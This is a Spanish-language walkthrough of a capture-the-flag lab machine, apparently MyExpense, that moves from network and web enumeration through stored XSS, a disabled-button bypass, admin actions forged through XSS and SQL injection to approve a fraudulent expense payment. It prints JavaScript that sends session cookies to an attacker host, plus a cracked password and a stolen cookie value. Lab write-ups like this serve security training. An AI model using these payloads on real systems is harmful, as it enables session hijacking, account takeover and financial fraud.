## Enumeración

Lo primero que vamos a hacer es identificar la máquina víctima. Como nos encontramos en el mismo segmento de red, utilizaremos [[Arp-Scan]] para descubrir los dispositivos disponibles:

```
arp-scan -I eth0 --localnet --ignoredups
```

![[Pasted image 20250824203224.png]]

Como podemos observar, ya tenemos la dirección IP de la máquina víctima. En este caso, al tratarse de una máquina virtual en VMware, identificamos la dirección `192.168.1.103`.

Vamos a utilizar `ping` para comprobar si la máquina está activa y obtener una primera pista sobre el sistema operativo:

```
ping -c 1 192.168.1.103
```

![[Pasted image 20250824204137.png]]

Como podemos ver, obtenemos un `TTL=64`, lo que nos permite sospechar que estamos ante un sistema Linux. Sin embargo, este valor es solo una referencia y no confirma por sí solo el sistema operativo.

Ahora, vamos a comenzar con el escaneo de puertos utilizando [[Nmap]]:

```
nmap -p- --open -sS --min-rate 5000 -v -n -Pn 192.168.1.103 -oG allPorts
```

![[Pasted image 20250824204355.png]]

Una vez identificados los puertos abiertos, vamos a realizar un escaneo más preciso para obtener información sobre los servicios y sus versiónes:

```
nmap -p80,37541,45353,46527,59679 -sCV 192.168.1.103 -oN target
```

![[Pasted image 20250824204602.png]]

Como podemos observar, ahora tenemos información más detallada de los servicios disponibles. Podemos aprovechar la versión del servicio web que se ejecuta en el puerto 80 para investigar el _codename_ de la distribución mediante Launchpad.

![[Pasted image 20250824204802.png]]

Como resultado de esta consulta, identificamos que se trata de una máquina con Debian Stretch.

En este punto, sabemos que tenemos un servicio web en el puerto `80`, por lo que vamos a acceder a la página para comprobar qué encontramos:

![[Pasted image 20250824204914.png]]

Como podemos observar, tenemos una página de inicio de sesión y una opción para crear una cuenta. Sin embargo, antes de comenzar a probar estas funcionalidades, vamos a continuar enumerando la web para buscar otros recursos que puedan ser interesantes. Para ello, utilizaremos [[Gobuster]]:

```
gobuster dir -u http://192.168.1.103 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

![[Pasted image 20250824205519.png]]

Como resultado, encontramos una ruta llamada `admin`. Vamos a acceder a ella para comprobar qué información nos proporciona:

![[Pasted image 20250824205556.png]]

Como podemos observar, no podemos acceder a esta sección sin disponer de las credenciales necesarias. Por lo tanto, vamos a continuar enumerando el directorio `admin` para comprobar si encontramos algún archivo que podamos investigar. Además, mediante Wappalyzer, podemos observar que la aplicación utiliza PHP.

![[Pasted image 20250824205732.png]]

Para profundizar en la enumeración, vamos a utilizar Gobuster con la extensión `.php`:

```
gobuster dir -u http://192.168.1.103/admin -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
```

![[Pasted image 20250824205855.png]]

Como resultado, encontramos el archivo `admin.php`. Vamos a acceder a él para comprobar qué información podemos obtener:

![[Pasted image 20250824205949.png]]

Como podemos ver, la página muestra bastante información, entre ella el usuario administrador `rmasson`, otros usuarios y sus respectivos roles. También podemos observar que nuestra cuenta aparece como inactiva.

Al pulsar sobre el estado `inactive`, encontramos lo siguiente:

![[Pasted image 20250824210115.png]]

En la URL aparece lo que parece ser una petición para activar la cuenta. Sin embargo, desde nuestra sesión no conseguimos realizar la activación.

Por la información del ejercicio, sabemos que la persona se llama `samuel` y que su contraseña era `fzghn4lw`, pero todavía no conocemos su nombre de usuario. Si revisamos la tabla de usuarios, encontramos que su cuenta corresponde a `slamotte`, por lo que vamos a intentar iniciar sesión con esas credenciales:

![[Pasted image 20250824210421.png]]

Como podemos observar, la aplicación nos indica que la cuenta está bloqueada. Por el momento, no podemos avanzar por esta vía, así que vamos a comprobar si es posible crear una cuenta nueva.

![[Pasted image 20250824210535.png]]

Ya hemos rellenado los datos, pero el botón para crear la cuenta aparece deshabilitado. Como este comportamiento podría estar controlado únicamente desde el HTML de la página, vamos a inspeccionar el elemento para comprobar cómo está implementado.

![[Pasted image 20250824210722.png]]

Como podemos observar, el botón tiene el atributo `disabled=""`. Vamos a probar a quitarlo desde las herramientas de desarrollo del navegador para comprobar si podemos continuar:

![[Pasted image 20250824211029.png]]

En efecto, al quitar el atributo, conseguimos habilitar el botón y continuar con el registro.

![[Pasted image 20250824211051.png]]

Como vemos, la cuenta se ha creado correctamente. Ahora, si volvemos a revisar `/admin/admin.php`, deberíamos poder encontrar el nuevo usuario:

![[Pasted image 20250824211149.png]]

Sin embargo, la cuenta aparece como inactiva. Algo que llama nuestra atención es que los valores de `Firstname` y `Lastname` se muestran tal como los introdujimos. Esto nos lleva a comprobar si esos campos, así como el nombre de usuario, son vulnerables a [[Cross-Site Scripting XSS]].

## Explotación

Para comenzar, vamos a probar si podemos introducir una alerta de JavaScript:

![[Pasted image 20250824211447.png]]

Ahora, vamos a enviar los datos y comprobar si se ejecuta el código:

![[Pasted image 20250824211548.png]]

Como podemos observar, conseguimos que aparezca la alerta. Además, el comportamiento se repite, lo que nos hace pensar que el contenido introducido en estos campos podría estar ejecutándose cada vez que se carga la página.

En este punto, vamos a investigar si podemos aprovechar el XSS para obtener información de la sesión de otro usuario que visite esta web. Para ello, levantaremos un servidor que reciba las peticiónes y prepararemos un script externo de JavaScript que enviaremos mediante un nuevo usuario.

Lo primero será crear el usuario que cargará el script externo y levantar el servidor que recibirá las peticiónes:

![[Pasted image 20250824212036.png]]

![[Pasted image 20250824212453.png]]

Una vez enviado el contenido, vamos a esperar antes de acceder nosotros mismos. Si recibimos alguna petición, tendremos indicios de que otro usuario está visitando la página de forma recurrente.

![[Pasted image 20250824212647.png]]

Como podemos observar, estamos recibiendo peticiónes. Esto sugiere que alguien está accediendo a la web de forma continua, así que vamos a preparar el script para comprobar si podemos obtener la cookie de sesión.

El primer paso será intentar capturar la cookie del usuario que visita la página:

```
var request = new XMLHttpRequest();
request.open('GET', "http://192.168.1.70/?cookie=" + document.cookie);
request.send();
```

![[Pasted image 20250824213044.png]]

Como podemos observar, conseguimos recibir la cookie de sesión. Por lo tanto, vamos a probarla en el navegador para identificar a qué usuario corresponde:

![[Pasted image 20250824213241.png]]

Al parecer, se trata del usuario administrador. Sin embargo, la aplicación nos indica que solo una persona puede estar conectada como administrador al mismo tiempo.

Aunque esto nos impide mantener una sesión simultánea con él, también nos proporciona una pista importante. Si analizamos el funcionamiento de la aplicación, podemos intentar que el administrador ejecute una petición en nuestro nombre para activar una cuenta.

Recordemos que queremos activar la cuenta de `samuel`. Cuando pulsábamos sobre su estado, obteníamos la siguiente URL:

![[Pasted image 20250824210115.png]]

Por lo tanto, parece que la aplicación utiliza una petición GET para cambiar el estado de la cuenta. Vamos a intentar que el administrador realice esa petición mediante el script externo, modificándolo de la siguiente manera:

```
var request = new XMLHttpRequest();
request.open('GET', "http://192.168.1.103/admin/admin.php?id=11&status=active");
request.send();
```

El nuevo script hará que el navegador de quien lo cargue envíe la petición indicada. Ahora vamos a levantar el servidor y esperar a que se produzca una conexión. Si la petición se ejecuta con la sesión del administrador, podremos comprobar si la cuenta se ha activado.

![[Pasted image 20250824213951.png]]

Como podemos observar, recibimos la petición. Ahora vamos a revisar nuevamente `/admin/admin.php` para comprobar si el estado de la cuenta ha cambiado:

![[Pasted image 20250824214036.png]]

En efecto, la cuenta aparece activa. Por lo tanto, vamos a intentar iniciar sesión con las credenciales que encontramos anteriormente:

![[Pasted image 20250824214321.png]]

Como podemos observar, conseguimos acceder a la cuenta.

![[Pasted image 20250824214405.png]]

Una vez dentro, vemos que nuestro objetivo es enviar una solicitud de pago. Vamos a realizar el proceso para comprobar qué sucede:

![[Pasted image 20250824214500.png]]

Como resultado, la solicitud aparece como `submitted`. Sin embargo, nuestro objetivo es que sea aceptada para poder retirar el pago. Por lo tanto, vamos a investigar qué usuario se encarga de aprobar las solicitudes.

![[Pasted image 20250824214607.png]]

Al revisar la información de la cuenta, encontramos que nuestro _manager_ es Manon Riviere. Esto nos hace pensar que podría ser la responsable de aprobar el pago.

Si tenemos en cuenta que su cuenta tiene un rol diferente al nuestro, es posible que disponga de una sección adicional desde la que pueda gestionar las solicitudes. Por lo tanto, vamos a investigar si podemos acceder a esa cuenta.

![[Pasted image 20250824214843.png]]

Al revisar la página principal, encontramos información de varios usuarios, entre ellos Manon Riviere. Como ya hemos identificado una vulnerabilidad XSS, vamos a comprobar si podemos aprovecharla de nuevo para obtener la cookie de sesión de los usuarios que visitan esta sección.

En este caso, vamos a utilizar un puerto diferente para evitar conflictos con el servidor anterior:

```
var request = new XMLHttpRequest();
request.open('GET', "http://192.168.1.70:4646/?cookie=" + document.cookie);
request.send();
```

Ahora, vamos a introducir el nuevo contenido en el mensaje y comprobar si se ejecuta:

![[Pasted image 20250824215548.png]]

Una vez enviado, vamos a esperar las conexiones que lleguen a nuestro servidor:

![[Pasted image 20250824215638.png]]

Como podemos observar, recibimos varias cookies de sesión. Recordemos que el administrador no puede mantener varias sesiones simultáneas, pero los demás usuarios podrían hacerlo. Por lo tanto, vamos a comprobar las cookies obtenidas hasta identificar la que corresponde a Manon Riviere.

La cookie que identificamos para Manon Riviere es:

`1ua1glfeiqo3k7m1qd5gmr6495`

Ahora, vamos a utilizarla para comprobar si podemos acceder a su cuenta:

![[Pasted image 20250824215914.png]]

Perfecto, ya estamos dentro de la cuenta. Vamos a revisar los reportes para comprobar si encontramos nuestra solicitud de pago:

![[Pasted image 20250824215954.png]]

Como podemos observar, aparece nuestra solicitud. Vamos a aprobarla para comprobar si con esto conseguimos completar el proceso:

![[Pasted image 20250824220051.png]]

Sin embargo, la aplicación indica que el pago ha sido validado, pero todavía no ha sido aceptado. Por lo tanto, parece que existe otro nivel de aprobación y que Manon Riviere también necesita la autorización de su propio _manager_.

![[Pasted image 20250824220205.png]]

Como podemos observar, su _manager_ parece ser `Paul Baudouin`. Ahora vamos a intentar acceder a su cuenta. Primero, comprobaremos si también aparece en el chat y si conseguimos obtener su cookie de sesión.

![[Pasted image 20250824220400.png]]

En efecto, aparece en el chat. Sin embargo, después de probar las cookies que hemos capturado, no conseguimos identificar la suya. Esto podría indicar que no está visitando esa sección durante nuestras pruebas.

Como todavía no hemos encontrado una forma de acceder a su cuenta, vamos a seguir investigando la aplicación. Al revisar la sección de `Renes`, encontramos algo interesante en la URL:

![[Pasted image 20250824220521.png]]

Como podemos observar, aparece un parámetro `id=2`. Esto nos hace sospechar que la aplicación podría estar consultando información de la base de datos mediante ese parámetro. Por lo tanto, vamos a comprobar si es vulnerable a [[SQLI]].

![[Pasted image 20250824220747.png]]

Como podemos ver, encontramos indicios de que el parámetro es vulnerable a SQL Injection. Vamos a profundizar en la prueba para determinar si podemos obtener información de la base de datos:

![[Pasted image 20250824220944.png]]

La respuesta muestra los valores `1` y `2`, lo que nos permite continuar investigando cómo se procesa la consulta:

![[Pasted image 20250824221058.png]]

A partir de aquí, vamos a enumerar las bases de datos disponibles. Entre los resultados, encontramos una base de datos llamada `myexpense`, que resulta especialmente interesante para el contexto de la aplicación.

![[Pasted image 20250824221253.png]]

Dentro de la base de datos, encontramos una tabla llamada `user`. Vamos a investigar su estructura para identificar qué información almacena:

![[Pasted image 20250824221433.png]]

Como podemos observar, encontramos los campos `username` y `password`. Por lo tanto, vamos a comprobar si podemos recuperar los datos almacenados en esas columnas:

![[Pasted image 20250824221617.png]]

Como resultado, obtenemos varios nombres de usuario y sus correspondientes valores de contraseña. El usuario que nos interesa es `pbaudouin`, cuyo valor almacenado es:

`64202ddd5fdea4cc5c2f856efef36e1a`

Por su formato, sospechamos que se trata de un hash MD5. Vamos a comprobarlo con una herramienta de identificación de hashes:

![[Pasted image 20250824222119.png]]

Como podemos observar, la herramienta identifica el valor como MD5. Ahora vamos a intentar recuperar la contraseña original utilizando un servicio de búsqueda de hashes:

![[Pasted image 20250824222227.png]]

El resultado sugiere que la contraseña es `HackMe`. Con esto en mente, vamos a probar las credenciales para comprobar si podemos acceder a la cuenta de Paul Baudouin:

![[Pasted image 20250824222341.png]]

## Escalada de privilegios

Perfecto, conseguimos iniciar sesión en la cuenta de Paul Baudouin. En este punto, hemos conseguido acceder a una cuenta con un nivel de responsabilidad superior dentro de la aplicación. Ahora vamos a revisar sus opciones para comprobar si podemos completar la aprobación que todavía está pendiente.

Una vez dentro, encontramos una opción llamada `Expense reports`, así que vamos a revisarla para comprobar si aparece nuestra solicitud de pago:

![[Pasted image 20250824222427.png]]

Como podemos observar, nuestra solicitud aparece en la lista. Ahora vamos a aprobarla para comprobar si finalmente conseguimos completar el proceso:

![[Pasted image 20250824222458.png]]

Como vemos, el pago queda aprobado. De esta manera, conseguimos completar el objetivo principal de la máquina.

**¡Máquina terminada!**